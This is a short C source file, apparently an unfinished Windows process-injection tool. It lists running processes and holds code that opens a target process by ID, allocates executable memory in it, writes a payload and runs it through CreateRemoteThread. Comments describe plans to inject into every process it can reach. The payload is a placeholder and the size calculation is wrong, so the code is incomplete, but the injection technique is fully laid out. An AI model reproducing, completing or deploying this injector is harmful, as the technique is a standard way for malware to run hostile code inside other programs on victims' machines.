#include <windows.h>
#include <stdio.h>
#include <psapi.h>


int		main(int argc, char** argv) {


	// trying to fix this part to get list of processes, the psapi.a somehow is not linked !
	size_t lpidProcessSize = 1024;
	DWORD *lpidProcess = (DWORD*)malloc(sizeof(DWORD) * lpidProcessSize);
	DWORD processesReturned;

	if (!EnumProcesses(lpidProcess, sizeof(DWORD) * 1024, &processesReturned)) {
		printf("Couldn't fetch processes running on the machine, Error code %lx\n", GetLastError());
		free(lpidProcess);
		return EXIT_FAILURE;
	}


	return EXIT_SUCCESS;

	/* This part is working where we inject a process with payload code,
	 * but now we need to fetch all processes we have running, and hook to ones that we are allowed too
	 */

	char *payload = "\x69\x69";
	size_t payloadSize = sizeof(payload); 


	HANDLE HProcess = NULL;
	int pid = atoi(argv[1]);

	if (!(HProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid))) {
		printf("Couldn't get access to the provided process id, Error code %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	LPVOID VMPointer = NULL;

	if (!(VMPointer = VirtualAllocEx(HProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("Couldn't reserve/alloc memory in process virtualAddress, Error code %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("HProcess : 0x%p\nVMPointer : 0x%p\n", HProcess, VMPointer);

	SIZE_T dataWritten = 0;
	boolean wasDelivered = FALSE;

	if (!(wasDelivered = WriteProcessMemory(HProcess, VMPointer, payload, payloadSize, &dataWritten))) {
		printf("Couldn't deliver the playload, Error code %lx\n", GetLastError());
		// need to brut-force !
		return EXIT_FAILURE;
	}

	if (dataWritten != payloadSize) {
		printf("Payload wasn't written in its entirety, payloadSize: %ud, dataWritten: %ud\n", payloadSize, dataWritten);
	}
	
	printf("payloadSize: %zu, dataWritten: %zu\n", payloadSize, dataWritten);

	HANDLE HThread = NULL;

	DWORD dwThreadId = 0;

	if (!(HThread = CreateRemoteThread(HProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VMPointer, NULL, 0, &dwThreadId))) {
		printf("Couldn't summon a thread. to execute the payload, %lx\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("Thread was summoned correctly with id : %ud\n", dwThreadId);

	return EXIT_SUCCESS; 
}